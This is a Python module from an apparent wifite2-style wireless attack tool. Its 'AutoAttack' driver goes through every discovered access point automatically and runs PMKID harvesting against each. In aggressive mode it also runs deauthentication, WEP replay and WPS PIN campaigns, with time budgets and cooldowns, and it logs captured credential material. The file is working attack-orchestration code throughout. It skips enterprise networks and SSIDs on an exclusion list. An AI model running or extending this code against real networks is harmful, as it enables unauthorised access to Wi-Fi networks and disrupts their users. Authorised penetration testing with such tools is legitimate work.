"""AutoAttack: a wifite2-style driver that walks every discovered AP and runs the fitting campaign
against each, skipping an exclusion list of SSIDs and every WPA-Enterprise network (its evil twin
stays a manual, interactive Focus action).

The driver is not itself a ``Campaign``: it owns no radio. It starts the real campaigns one at a
time, respecting the global ``Campaign.active`` mutex, and stops channel-hopping only while a target
is under attack, resuming it between batches so new APs keep turning up. Passive by default (PMKID
harvest only); ``aggressive`` also allows the TX-heavy campaigns (deauth, WEP replay, WPS PIN).
"""
from __future__ import annotations

import asyncio
import logging
import time
from typing import Callable, Optional

from wifit3.campaigns.campaign import Campaign
from wifit3.campaigns.deauth import DeauthCampaign
from wifit3.campaigns.pin import WpsCampaign
from wifit3.campaigns.pmkid import PmkidHarvestAttack
from wifit3.campaigns.wep import WepCampaign
from wifit3.crack.handshake import crackable_captures
from wifit3.models import AccessPoint
from wifit3.models.access_point import eap_only

logger = logging.getLogger(__name__)

_POLL_SEC = 0.25
_DEFAULT_SCAN_WINDOW_SEC = 8.0      # hop to rediscover between attack batches
_DEFAULT_COOLDOWN_SEC = 90.0       # don't re-run the same campaign on an AP more often than this

# Seconds to let each campaign own the radio before moving on. PMKID finishes on its own
# (a few association rounds); the continuous TX campaigns are time-boxed.
_BUDGET_SEC = {
    "pmkid": 30.0,
    "deauth": 15.0,
    "wep": 60.0,
    "wps": 90.0,
}

# Least-disruptive first. Non-aggressive runs only the passive-by-default PMKID harvest.
_PASSIVE_ORDER = (PmkidHarvestAttack,)
_AGGRESSIVE_ORDER = (WepCampaign, WpsCampaign, PmkidHarvestAttack, DeauthCampaign)


def select_campaigns(ap: AccessPoint, *, aggressive: bool) -> list[type[Campaign]]:
    """The campaigns to try against ``ap``, in run order, filtered by each campaign's own
    eligibility. WPA-Enterprise yields nothing: that is the evil twin's job, and it stays manual."""
    if eap_only(ap):
        return []
    order = _AGGRESSIVE_ORDER if aggressive else _PASSIVE_ORDER
    return [cls for cls in order if cls.visible(ap) and cls.ineligible_reason(ap) is None]


def already_won(ap: AccessPoint) -> bool:
    """Whether ``ap`` already has something crackable, so there is nothing left to attack."""
    if (ap.encryption or "").upper() == "WEP":
        return ap.wep_key is not None
    return bool(crackable_captures(ap))


def _construct(cls: type[Campaign], array, ap: AccessPoint,
               log: Callable[[str], None]) -> Campaign:
    """Build a campaign, bridging the one constructor whose log keyword differs (WEP)."""
    if cls is WepCampaign:
        return cls(array, ap, log_callback=log)
    return cls(array, ap, log=log)


class AutoAttack:
    def __init__(self, array, *, aggressive: bool, excluded_ssids: list[str],
                 channels: Optional[list[int]] = None, include_dfs: bool = False,
                 log: Optional[Callable[[str], None]] = None,
                 on_capture: Optional[Callable[[AccessPoint], None]] = None,
                 scan_window_sec: float = _DEFAULT_SCAN_WINDOW_SEC,
                 cooldown_sec: float = _DEFAULT_COOLDOWN_SEC):
        self.array = array
        self.aggressive = aggressive
        self._excluded = {s.casefold() for s in excluded_ssids}
        self.channels = channels
        self.include_dfs = include_dfs
        self._log = log or (lambda _m: None)
        self._on_capture = on_capture or (lambda _ap: None)
        self.scan_window_sec = scan_window_sec
        self.cooldown_sec = cooldown_sec
        self._stopped = False
        self._running = False
        self._attempted: dict[tuple[str, str], float] = {}
        self.attacked = 0
        self.captured = 0
        self.current: Optional[str] = None

    @property
    def running(self) -> bool:
        return self._running

    def request_stop(self) -> None:
        self._stopped = True
        active = Campaign.active
        if active is not None:
            active.request_stop()

    async def run(self) -> None:
        self._running = True
        self._log(f"[bold cyan]Auto-Attack started[/bold cyan] "
                  f"({'aggressive' if self.aggressive else 'passive'})")
        announced_idle = False
        try:
            while not self._stopped:
                targets = self._pick_targets()
                if targets:
                    announced_idle = False
                    self._log(f"[cyan]▸ attacking {len(targets)} target(s)[/cyan]")
                    await self._attack_batch(targets)
                elif not announced_idle:
                    announced_idle = True
                    kind = ("WEP / WPS / WPA·WPA2-PSK" if self.aggressive
                            else "WPA / WPA2-PSK (PMKID)")
                    self._log(f"[dim]No eligible targets yet: need {kind}; enterprise and excluded "
                              f"SSIDs are skipped. Still scanning…[/dim]")
                await self._interruptible_sleep(self.scan_window_sec)
        finally:
            self.current = None
            self._running = False
            await self._resume_hopping()
            self._log("[bold]Auto-Attack stopped[/bold]")

    def _pick_targets(self) -> list[AccessPoint]:
        targets = []
        for ap in self.array.get_access_points(include_eviltwin=False):
            if not ap.ssid or self.is_excluded(ap.ssid) or already_won(ap):
                continue
            if select_campaigns(ap, aggressive=self.aggressive):
                targets.append(ap)
        return targets

    def is_excluded(self, ssid: Optional[str]) -> bool:
        return bool(ssid) and ssid.casefold() in self._excluded

    async def _attack_batch(self, targets: list[AccessPoint]) -> None:
        await self.array.stop_hopping()
        try:
            for ap in targets:
                if self._stopped:
                    return
                for cls in select_campaigns(ap, aggressive=self.aggressive):
                    if self._stopped or already_won(ap):
                        break
                    if self._on_cooldown(ap.bssid, cls.key):
                        continue
                    try:
                        await self._run_one(ap, cls)
                    except Exception:               # noqa: BLE001 - one bad target must not end the run
                        logger.exception("auto-attack: %s on %s failed", cls.key, ap.bssid)
                        self._log(f"[red]✗ {cls.idle_label} on {ap.ssid or ap.bssid} errored; "
                                  f"continuing[/red]")
        finally:
            await self._resume_hopping()

    async def _run_one(self, ap: AccessPoint, cls: type[Campaign]) -> None:
        self._attempted[(ap.bssid, cls.key)] = time.monotonic()
        self.current = f"{cls.key} → {ap.ssid or ap.bssid}"
        self._log(f"[cyan]▸ {cls.idle_label}[/cyan] on [bold]{ap.ssid or ap.bssid}[/bold] "
                  f"(CH {ap.channel})")
        camp = _construct(cls, self.array, ap, self._log)
        if not camp.run():
            logger.debug("auto-attack: radio busy, deferring %s on %s", cls.key, ap.bssid)
            return
        self.attacked += 1
        budget = _BUDGET_SEC.get(cls.key, 20.0)
        elapsed = 0.0
        while not camp.done and elapsed < budget and not self._stopped:
            if already_won(ap):
                break
            await asyncio.sleep(_POLL_SEC)
            elapsed += _POLL_SEC
        if not camp.done:
            await camp.stop()
        if already_won(ap):
            self.captured += 1
            self._on_capture(ap)
            self._log(f"[bold green]✓ Captured[/bold green] credentials material for "
                      f"[bold]{ap.ssid or ap.bssid}[/bold]")

    def _on_cooldown(self, bssid: str, key: str) -> bool:
        last = self._attempted.get((bssid, key))
        return last is not None and (time.monotonic() - last) < self.cooldown_sec

    async def _resume_hopping(self) -> None:
        try:
            await self.array.start_hopping(channels=self.channels, interval=0.25,
                                           include_dfs_channels=self.include_dfs)
        except Exception:
            logger.exception("auto-attack: failed to resume channel hopping")

    async def _interruptible_sleep(self, seconds: float) -> None:
        elapsed = 0.0
        while elapsed < seconds and not self._stopped:
            await asyncio.sleep(_POLL_SEC)
            elapsed += _POLL_SEC
